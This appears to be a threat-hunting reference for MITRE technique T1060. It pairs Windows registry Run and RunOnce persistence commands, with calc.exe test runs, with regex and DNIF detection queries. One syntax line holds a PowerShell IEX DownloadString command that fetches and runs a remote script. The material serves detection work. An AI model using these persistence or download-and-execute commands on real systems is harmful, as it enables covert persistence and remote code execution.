# Registry Run Keys / Startup Folder - T1060
---


### 1. Reg Key Run
> Run Key Persistence

Syntax
```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /t REG_SZ /F /D "#{command_to_execute}"
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Atomic Red Team" /f
```
Command Execution
```
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Threat Hunting Test" /t REG_SZ /F /D "C:\Windows\System32\calc.exe"
REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Threat Hunting Test" /f
```
regex for detection
```
(?i).*reg.*add.*hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run.*\/v.*reg\_sz.*
(?i).*reg.*delete.*hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run.*\/v.*
```
DNIF QUERY
```
_fetch * from event where $LogName=WINDOWS-SYSMON AND $EventID=1 AND $Process=regex(.*reg.*add.*hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run.*\/v.*reg\_sz.*)i group count_unique $App, $Process, $ParentProcess, $DevSrcIP limit 100
_fetch * from event where $LogName=WINDOWS-SYSMON AND $EventID=1 AND $Process=regex(.*reg.*delete.*hkcu\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run.*\/v.*)i group count_unique $App, $Process, $ParentProcess, $DevSrcIP limit 100
```
---
### 2.  Reg Key RunOnce
> RunOnce Key Persistence

Syntax
```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "#{thing_to_execute}"
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
```
Command Execution
```
REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d "C:\Windows\System32\calc.exe"
REG DELETE HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /f
```
regex for detection
```
(?i).*reg.*add.*hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonceex.*\/v.*\/d.*
(?i).*reg.*delete.*hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonceex.*\/v.*\/f.*
```
DNIF QUERY
```
_fetch * from event where $LogName=WINDOWS-SYSMON AND $EventID=1 AND $Process=regex(.*reg.*add.*hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonceex.*\/v.*\/d.*)i group count_unique $App, $Process, $ParentProcess, $DevSrcIP limit 100
_fetch * from event where $LogName=WINDOWS-SYSMON AND $EventID=1 AND $Process=regex(.*reg.*delete.*hklm\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\runonceex.*\/v.*\/f.*)i group count_unique $App, $Process, $ParentProcess, $DevSrcIP limit 100
```
---
### 3. PowerShell Registry RunOnce
> RunOnce Key Persistence via PowerShell

Syntax
```
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" '#{thing_to_execute} "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat`")"'
Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
```
Command Execution
```
$RunOnceKey = "HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
set-itemproperty $RunOnceKey "NextRun" 'C:\Windows\System32\calc.exe'
Remove-ItemProperty -Path $RunOnceKey -Name "NextRun" -Force
```
DNIF QUERY
```
_fetch * from event where $ObjectName=HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\NextRun AND $LogName=WINDOWS-SYSMON AND $EventID=12 limit 100
```
